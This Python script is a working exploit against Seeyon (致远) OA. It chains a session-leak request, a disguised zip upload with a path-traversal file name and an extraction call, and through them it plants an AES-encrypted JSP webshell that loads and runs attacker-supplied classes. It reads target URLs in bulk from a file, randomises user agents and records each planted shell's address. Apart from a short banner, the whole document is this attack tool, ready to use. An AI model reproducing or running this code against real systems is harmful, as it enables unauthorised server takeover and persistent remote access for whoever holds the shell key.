#coding:utf-8
import time
import datetime
import zipfile
import random
import string
import requests
import re
import os

requests.packages.urllib3.disable_warnings()

def title():
    print('+---------------------------------------------------')
    print('+  \033[34mVersion:  致远OA Session泄露 任意文件上传漏洞                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                               \033[0m')
    print('+  \033[36m文件名:    url.txt                                                      \033[0m')
    print('+---------------------------------------------------')

#随机ua
def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua

def check_file():
    path = os.getcwd()
    file_path = os.path.join(path,"payload.zip")
    if os.path.exists(file_path):
        os.remove(file_path)


def write_zipfile(fname, content):
    with zipfile.ZipFile(
            'payload.zip',
            mode='a',
            compression=zipfile.ZIP_DEFLATED,
    ) as zf:
        zf.writestr('layout.xml', "")
        zf.writestr(fname, content)



def rand_str(num):
    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, num))
    return ran_str

def get_cookie(targeturl):
    headers = {'User-Agent': get_ua(),'Content-Type': 'application/x-www-form-urlencoded'}
    url = '{targeturl}/seeyon/thirdpartyController.do'.format(targeturl=targeturl)
    post="method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1".encode("utf-8")
    try:
        response = requests.post(url=url,data=post,headers=headers, timeout=60,verify=False)
        if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
            cookies = response.cookies
            cookies = requests.utils.dict_from_cookiejar(cookies)
            jsessionid = cookies['JSESSIONID']
            return jsessionid
        else:
            exit()
    except:
        pass

    
def upload_zip(targeturl,cookie):
    url = '{targeturl}/seeyon/fileUpload.do?method=processUpload'.format(targeturl=targeturl)
    files = [('file1', ('11.png', open('payload.zip', 'rb'), 'application/octet-stream'))]
    headers = {'Cookie':'JSESSIONID={cookie}'.format(cookie=cookie),'User-Agent': get_ua()}
    post = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0',
                'isEncrypt': "0"}
    try:
        response = requests.post(url=url,files=files,data=post, headers=headers,timeout=60,verify=False)
        if response and response.status_code == 200 and 'fileurls=' in response.text:
                fileid = re.findall('fileurls=fileurls\+","\+\'(.+)\'',response.text,re.I)
                if len(fileid) > 0:
                    return fileid[0]
                else:
                    exit()
    except:
        pass

def extract_file(targeturl,cookie,fileid):
    url = '{targeturl}/seeyon/ajax.do'.format(targeturl=targeturl)
    headers = {'Cookie':'JSESSIONID={cookie}'.format(cookie=cookie),'User-Agent': get_ua(), 'Content-Type':'application/x-www-form-urlencoded'}
    datestr = time.strftime('%Y-%m-%d')
    post = f'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22{datestr}%22%2C%22{fileid}%22%5D'
    try:
        response = requests.post(url, data=post,headers=headers,timeout=60,verify=False)
        if response.status_code == 500 and "Error" in response.text:
            #print("[+] extract file is ok!")
            return True
        else:
            #print("[-] extract file error !")
            exit()
    except:
        pass





def main(targeturl):
    fname = f'../{rand_str(8)}.jsp'
    shell = r'<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="5823cd3093f16f3b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
    check_file()
    write_zipfile(fname,shell)
    cookie = get_cookie(targeturl)
    fileid = upload_zip(targeturl, cookie)
    if extract_file(targeturl, cookie, fileid):
        url = targeturl + '/seeyon/common/designer/pageLayout/{fname}'.format(fname=fname.split('/')[1])
        with open('webshell.txt', 'a', encoding='utf8') as web:
            web.write("webshell 地址: {url}\n".format(url=url))
        print("\033[32m[+]目标 {} 被上传木马: {}\033[0m".format(targeturl, url))

# 获取每行url
def get_urls_head(targeturl):
        line = 'http://'+targeturl
        lines ='https://'+targeturl
        try:
            response=requests.get(url=line,timeout=10,verify=False)
            if (response.status_code == 200):
                return line
            response = requests.get(url=lines, timeout=10, verify=False)
            if (response.status_code == 200):
                return lines
        except:
            pass

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35m请输入需要检测的文件名：\033[0m"))
    for line in open(file_name):
        line = line.strip('\n')
        targeturl = get_urls_head(line)
        if (targeturl != None):
            main(targeturl)

